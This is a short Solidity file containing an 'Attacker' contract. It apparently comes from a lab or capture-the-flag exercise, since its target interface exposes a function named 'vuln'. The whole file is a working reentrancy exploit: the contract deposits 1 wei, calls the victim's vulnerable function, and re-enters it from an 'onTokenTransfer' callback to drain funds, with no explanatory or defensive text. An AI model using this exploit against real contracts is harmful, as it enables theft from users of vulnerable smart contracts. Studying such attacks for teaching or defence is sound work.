pragma solidity 0.8.7;

interface IVictim {
	function balanceOf(address) external returns(uint256);
	function deposit() external payable;
	function vuln(uint256 amount) external;
}

contract Attacker {
	IVictim private target;
	address private owner;
	constructor(address _target) public payable {
		target = IVictim(_target);
		owner = msg.sender;
	}
	function exploit() external {
		require(msg.sender == owner);
		target.deposit{value:1 wei}();
		target.vuln(1);
	}
	function onTokenTransfer(address _sender, uint _value, bytes memory _data) external {
		if (target.balanceOf(msg.sender) > 0) {
			target.vuln(1);
		}
	}
}
